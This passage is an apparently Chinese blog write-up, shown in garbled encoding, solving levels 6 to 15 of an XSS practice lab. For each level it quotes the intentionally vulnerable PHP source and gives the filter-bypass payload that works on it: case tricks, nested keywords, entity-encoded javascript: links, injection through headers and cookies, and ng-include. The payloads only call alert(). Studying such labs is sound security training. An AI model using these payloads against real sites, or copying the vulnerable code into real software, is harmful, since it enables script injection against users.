å—¯ è¿˜æ˜¯æœç´¢&lt;/h1&gt;&lt;?phpini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;&lt;input type=submit name=submit value=æœç´¢ /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/92847238-8dda-473f-9c04-83986de1472a.jpg&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str6).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="åˆ†æ-5"><a href="#åˆ†æ-5" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h3><p>æ›¿æ¢äº†scriptæ ‡ç­¾,on,src,data,herf,ä¸”htmlå®ä½“åŒ–çœ‹èµ·æ¥ä¼¼ä¹æ²¡é—®é¢˜ï¼Œä½†ç›¸æ¯”å‰å‡ å…³å‘ç°æ²¡æœ‰è½¬æ¢ä¸ºå°å†™ï¼Œæ‰€ä»¥å¯å¤§å°å†™æ¥ç»•è¿‡åŒ¹é…</p><h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload:"></a>payload:</h3><pre><code>&quot; ONclick=alert(&#39;XSS&#39;) //&quot;&gt;&lt;a Href=javascript:alert(&#39;XSS&#39;) //</code></pre><h2 id="ç¬¬7å…³"><a href="#ç¬¬7å…³" class="headerlink" title="ç¬¬7å…³"></a>ç¬¬7å…³</h2><h3 id="æŸ¥çœ‹æºç -6"><a href="#æŸ¥çœ‹æºç -6" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;å“å“Ÿ ä¸é”™å“¦ï¼&quot;); window.location.href=&quot;level8.php?keyword=ç¬¨é¸Ÿå…ˆé£&quot;; }&lt;/script&gt;&lt;title&gt;ç¬¬7å…³&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;ç¬¬7å…³ çŒœä¸€çŒœä¸‹é¢é¢˜ç›®è¿˜æœ‰æœç´¢å˜›&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str =strtolower( $_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;&lt;input type=submit name=submit value=æœç´¢ /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/17532328-f4cc-4bca-b283-c7f7b5a13f80.jpg&quot; width=&quot;20%&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str6).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="åˆ†æ-6"><a href="#åˆ†æ-6" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h3><p>getæ–¹å¼ä¼ å…¥keywordï¼Œstrtolowe()å‡½æ•°å˜ä¸ºå°å†™ï¼Œç„¶åreplace()å‡½æ•°åŒ¹é…scriptï¼Œonï¼Œsrcï¼Œdataï¼Œhrefï¼Œä½†æ˜¯åªæ˜¯åŒ¹é…äº†ä¸€æ¬¡ï¼Œæ‰€ä»¥å¯ä»¥åµŒå¥—ç»•è¿‡ï¼Œæœ€åhtmlspecialchars(),æ‰€ä»¥&lt; &gt; ä¸èƒ½ç”¨ï¼Œå°è¯•é—­åˆâ€</p><h3 id="payload-6"><a href="#payload-6" class="headerlink" title="payload:"></a>payload:</h3><pre><code>&quot; oonnclick=alert(&#39;XSS&#39;) //</code></pre><h2 id="ç¬¬å…«å…³"><a href="#ç¬¬å…«å…³" class="headerlink" title="ç¬¬å…«å…³"></a>ç¬¬å…«å…³</h2><h3 id="æŸ¥çœ‹æºç -7"><a href="#æŸ¥çœ‹æºç -7" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;å“å“Ÿ ä¸é”™å“¦ï¼&quot;); window.location.href=&quot;level9.php?keyword=æ°´æ»´çŸ³ç©¿&quot;; }&lt;/script&gt;&lt;title&gt;ç¬¬8å…³&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;ç¬¬8å…³ è€é“è¦å’Œæˆ‘æ¢å‹é“¾å˜›ï¼Ÿ&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);echo &#39;&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;?php echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/d2d2080f-746c-4276-9f63-585fc4fd4a9c.jpg&quot; width=&quot;20%&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="åˆ†æ-7"><a href="#åˆ†æ-7" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h3><p>getæ–¹å¼ä¼ å…¥keywordï¼Œstrtolower()è½¬æ¢ä¸ºå°å†™ï¼Œç„¶åreplaceæ›¿æ¢scriptï¼Œonï¼Œsrcï¼Œdataï¼Œhrefï¼Œâ€ï¼ˆâ€å·htmlå®ä½“åŒ–äº†ï¼‰,ç„¶åå‘ç°åˆhtmlå®ä½“åŒ–è¾“å…¥ï¼Œä¼¼ä¹æ²¡æœ‰é—®é¢˜ï¼Œç„¶åå‘ç°å‹æƒ…é“¾æ¥,æ²¡æœ‰htmlå®ä½“åŒ–è¾“å…¥ï¼Œå¯ä»¥å°è¯•åœ¨è¿™ä¸ªä½ç½®ç»•è¿‡ï¼Œä½†æ˜¯éƒ½è¢«è¿‡æ»¤äº†ï¼Œå°è¯•ç¼–ç ç»•è¿‡å¯¹JavaScript;alert(â€˜xssâ€™)ç¼–ç (å‘¸ï¼Œä¸æ˜¯ç¼–ç )è½¬ä¹‰<a href="https://www.jianshu.com/p/6dcefb2a59b2(å‚è€ƒé“¾æ¥)ï¼Œç›®çš„æ˜¯ç»•è¿‡replaceï¼Œç„¶åä»èƒ½è¢«htmlè§£æ" target="_blank" rel="noopener">https://www.jianshu.com/p/6dcefb2a59b2(å‚è€ƒé“¾æ¥)ï¼Œç›®çš„æ˜¯ç»•è¿‡replaceï¼Œç„¶åä»èƒ½è¢«htmlè§£æ</a><br><img src="https://Lmg66.github.io/img/133.png" alt="å›¾ç‰‡"></p><h3 id="payload-7"><a href="#payload-7" class="headerlink" title="payload:"></a>payload:</h3><pre><code>javascrip&amp;#x74:alert(&#39;xss&#39;)javascrip&amp;#x09t:alert(&#39;XSS&#39;)</code></pre><h2 id="ç¬¬ä¹å…³"><a href="#ç¬¬ä¹å…³" class="headerlink" title="ç¬¬ä¹å…³"></a>ç¬¬ä¹å…³</h2><h3 id="æŸ¥çœ‹æºç -8"><a href="#æŸ¥çœ‹æºç -8" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;å“å“Ÿ ä¸é”™å“¦ï¼&quot;); window.location.href=&quot;level10.php?keyword=æŒä¹‹ä»¥æ’&quot;; }&lt;/script&gt;&lt;title&gt;ç¬¬9å…³&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;ç¬¬9å…³ æ·»åŠ å‹è¿again&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);echo &#39;&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;?phpif(false===strpos($str7,&#39;http://&#39;)){  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#39;;        }else{  echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#39;;}?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/51fb4236-2965-42ab-851e-0ec266b3c3ba.jpg&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="åˆ†æ-8"><a href="#åˆ†æ-8" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h3><p>å’Œç¬¬å…«å…³ç›¸åŒï¼Œåªæ˜¯åˆ¤æ–­é“¾æ¥æ˜¯å¦åˆæ³•ï¼ŒåŠ ä¸Šhttp://å°±å¯ä»¥äº†</p><h3 id="payload-8"><a href="#payload-8" class="headerlink" title="payload:"></a>payload:</h3><pre><code>javascrip&amp;#x74:alert(&#39;xss&#39;) //http://</code></pre><h2 id="ç¬¬åå…³"><a href="#ç¬¬åå…³" class="headerlink" title="ç¬¬åå…³"></a>ç¬¬åå…³</h2><h3 id="æŸ¥çœ‹æºç -9"><a href="#æŸ¥çœ‹æºç -9" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;å“å“Ÿ ä¸é”™å“¦ï¼&quot;); window.location.href=&quot;level11.php?keyword=è‡ªå¼ºä¸æ¯&quot;; }&lt;/script&gt;&lt;title&gt;ç¬¬10å…³&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;ç¬¬10å…³ å—¯ æœç´¢åˆå‡ºç°äº†&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str11 = $_GET[&quot;t_sort&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/fed9cb1c-3111-49a8-b111-16081ac4b16c.jpg&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="åˆ†æ-9"><a href="#åˆ†æ-9" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h3><p>ä¼ å…¥keywordå’Œt_sort,keywordæ²¡æœ‰è¿‡æ»¤ï¼Œä½†æ˜¯htmlå®ä½“åŒ–è¾“å‡ºï¼Œè€Œä¸”æ²¡åœ¨æ ‡ç­¾å†…ï¼Œæ‰€ä»¥åº”è¯¥æ²¡é—®é¢˜ï¼Œçœ‹t_sortï¼Œè¿‡æ»¤äº†&lt; &gt; ,è€Œä¸”æ²¡æœ‰å®ä½“åŒ–è¾“å‡º<br>å°è¯•é—­åˆå¼•å·</p><h3 id="payload-9"><a href="#payload-9" class="headerlink" title="payload:"></a>payload:</h3><p><code>?keyword=123&amp;t_sort=&quot; type=&quot;text&quot; onclick=alert(&#39;XSS&#39;) //</code></p><h2 id="ç¬¬åä¸€å…³"><a href="#ç¬¬åä¸€å…³" class="headerlink" title="ç¬¬åä¸€å…³"></a>ç¬¬åä¸€å…³</h2><h3 id="æŸ¥çœ‹æºç -10"><a href="#æŸ¥çœ‹æºç -10" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;å“å“Ÿ ä¸é”™å“¦ï¼&quot;); window.location.href=&quot;level12.php?keyword=ç ´é‡œæ²‰èˆŸ&quot;; }&lt;/script&gt;&lt;title&gt;ç¬¬11å…³&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;ç¬¬11å…³ ä¸ºä»€ä¹ˆè¿™ä¹ˆå¤šæœç´¢å‘¢&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&#39;HTTP_REFERER&#39;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ref&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/60a6e17f-c823-40c3-ab84-502b2f905456.jpg&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="åˆ†æ-10"><a href="#åˆ†æ-10" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h3><p>strå’Œstr00éƒ½htmlå®ä½“åŒ–è€Œä¸”ä¸åœ¨scriptæ ‡ç­¾å†…éƒ¨ï¼Œä¸”é—­åˆä¸ºâ€™,åº”è¯¥æ— è§£ï¼Œç„¶åå‘ç°str33ï¼Œæ²¡æœ‰å®ä½“åŒ–ï¼Œ$_SERVER[â€˜HTTP_REFERERâ€™]è·å–httprefererä¿¡æ¯ï¼Œåªæ˜¯è¿‡æ»¤äº†&lt; &gt; ,å¯ä»¥é—­åˆåŒå¼•å·æ¥ç»•è¿‡,ä¸è¿‡æˆ‘æ²¡æ˜ç™½è¿™é¢˜å•¥ç”¨</p><h3 id="payload-10"><a href="#payload-10" class="headerlink" title="payload:"></a>payload:</h3><p><code>&quot; type = &quot;text&quot; onclick=alert(&#39;xss&#39;)//</code><br><img src="https://Lmg66.github.io/img/134.png" alt="å›¾ç‰‡"></p><h2 id="ç¬¬åäºŒå…³"><a href="#ç¬¬åäºŒå…³" class="headerlink" title="ç¬¬åäºŒå…³"></a>ç¬¬åäºŒå…³</h2><h3 id="æŸ¥çœ‹æºç -11"><a href="#æŸ¥çœ‹æºç -11" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;å“å“Ÿ ä¸é”™å“¦ï¼&quot;); window.location.href=&quot;level13.php?keyword=çŸ¢å¿—ä¸æ¸&quot;; }&lt;/script&gt;&lt;title&gt;ç¬¬12å…³&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;ç¬¬12å…³ é»‘äººé—®å·&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&#39;HTTP_USER_AGENT&#39;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ua&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/f4558b8c-778b-4dd8-bef6-425766f9d178.jpg&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="åˆ†æ-11"><a href="#åˆ†æ-11" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h3><p>å’Œä¸Šä¸€å…³ä¸€æ ·ï¼Œxssä½ç½®å˜ä¸€ä¸‹</p><h3 id="payload-11"><a href="#payload-11" class="headerlink" title="payload:"></a>payload:</h3><p><code>&quot; type = &quot;text&quot; onclick=alert(&#39;xss&#39;)//</code><br><img src="https://Lmg66.github.io/img/135.png" alt="å›¾ç‰‡"></p><h2 id="ç¬¬åä¸‰å…³"><a href="#ç¬¬åä¸‰å…³" class="headerlink" title="ç¬¬åä¸‰å…³"></a>ç¬¬åä¸‰å…³</h2><h3 id="æŸ¥çœ‹æºç -12"><a href="#æŸ¥çœ‹æºç -12" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;å“å“Ÿ ä¸é”™å“¦ï¼&quot;); window.location.href=&quot;level14.php&quot;; }&lt;/script&gt;&lt;title&gt;ç¬¬13å…³&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;ç¬¬13å…³ åšé¢˜å¥½çˆ½å•Š&lt;/h1&gt;&lt;?php setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_COOKIE[&quot;user&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#39;.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_cook&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#39;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/c048c2e3-7937-478b-9781-0ee4d7214648.jpg&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="åˆ†æ-12"><a href="#åˆ†æ-12" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h3><p>$_COOKIE[â€œuserâ€];è·å–cookieï¼Œç„¶åè¿‡æ»¤&lt; &gt; æ²¡æœ‰å®ä½“åŒ–è¾“å…¥ï¼Œå°è¯•é—­åˆåŒå¼•å·</p><h3 id="payload-12"><a href="#payload-12" class="headerlink" title="payload:"></a>payload:</h3><pre><code>user=&quot; type = &quot;text&quot; onclick=alert(&#39;xss&#39;)//</code></pre><p><img src="https://Lmg66.github.io/img/136.png" alt="å›¾ç‰‡"></p><h2 id="ç¬¬åå››å…³"><a href="#ç¬¬åå››å…³" class="headerlink" title="ç¬¬åå››å…³"></a>ç¬¬åå››å…³</h2><h3 id="æŸ¥çœ‹æºç -13"><a href="#æŸ¥çœ‹æºç -13" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script src=&quot;https://chao.jsanhuan.cn/angular.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;å“å“Ÿ ä¸é”™å“¦ï¼&quot;); window.location.href=&quot;level15.php?keyword=ä¸šç²¾äºå‹¤&quot;; }&lt;/script&gt;&lt;title&gt;ç¬¬14å…³&lt;/title&gt;&lt;/head&gt;&lt;h1 align=center&gt;ç¬¬14å…³ æ­å–œä½ å¿«è¦é€šå…³äº†&lt;/h1&gt;&lt;p align=center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/54c95d0f-037b-4885-a3f4-f8a3ad5c9341.jpg&quot; width=&quot;20%&quot;&gt;&lt;/p&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;src&quot;];echo &#39;&lt;body&gt;&lt;span class=&quot;ng-include:&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#39;;?&gt;</code></pre><h3 id="åˆ†æ-13"><a href="#åˆ†æ-13" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h3><p>ä¼ å…¥srcï¼Œç„¶åå®ä½“åŒ–è¾“å‡ºï¼Œç„¶åä¼¼ä¹æ— è§£ï¼Œä»”ç»†çœ‹å‰é¢ng-include:,<br>ng-include æŒ‡ä»¤ç”¨äºåŒ…å«å¤–éƒ¨çš„ HTML æ–‡ä»¶ã€‚åŒ…å«çš„å†…å®¹å°†ä½œä¸ºæŒ‡å®šå…ƒç´ çš„å­èŠ‚ç‚¹ã€‚ng-include å±æ€§çš„å€¼å¯ä»¥æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶åã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŒ…å«çš„æ–‡ä»¶éœ€è¦åŒ…å«åœ¨åŒä¸€ä¸ªåŸŸåä¸‹ã€‚æ‰€ä»¥ä¼ å…¥å…¶ä»–å…³çš„xssï¼Œä¸è¿‡ä¸çŸ¥é“è¿™æœ‰å•¥ç”¨æ—¢ç„¶å…¶ä»–åœ°ç‚¹æœ‰xss<br><img src="https://Lmg66.github.io/img/137.png" alt="å›¾ç‰‡"></p><h3 id="payload-13"><a href="#payload-13" class="headerlink" title="payload:"></a>payload:</h3><pre><code>src=&#39;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&#39;</code></pre><p>ç”±äºå¼•ç”¨çš„jsä»£ç å¤±è´¥ï¼Œæ‰€ä»¥æˆ‘æ²¡æˆåŠŸï¼Œä½†äº‘é¶æœºæ˜¯å¯¹çš„ï¼Œäº‘é¶æœºåœ°å€ï¼š<a href="https://www.xss.tv/" target="_blank" rel="noopener">https://www.xss.tv/</a><br><img src="https://Lmg66.github.io/img/138.png" alt="å›¾ç‰‡"></p><h2 id="ç¬¬åäº”å…³"><a href="#ç¬¬åäº”å…³" class="headerlink" title="ç¬¬åäº”å…³"></a>ç¬¬åäº”å…³</h2><h3 id="æŸ¥çœ‹æºç -14"><a href="#æŸ¥çœ‹æºç -14" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;ORZ ORZ ORZ æ­å–œå…¨éƒ¨é€šè¿‡&quot;); window.location.href=&quot;success.txt&quot;; }&lt;/script&gt;&lt;title&gt;ç¬¬15å…³&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;ç¬¬15å…³ å‰å®³äº† Wordå“¥&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);$str5=str_replace(&quot;    &quot;,&quot;&amp;nbsp;&quot;,$str4);echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;?&gt;&lt;center&gt;&lt;img 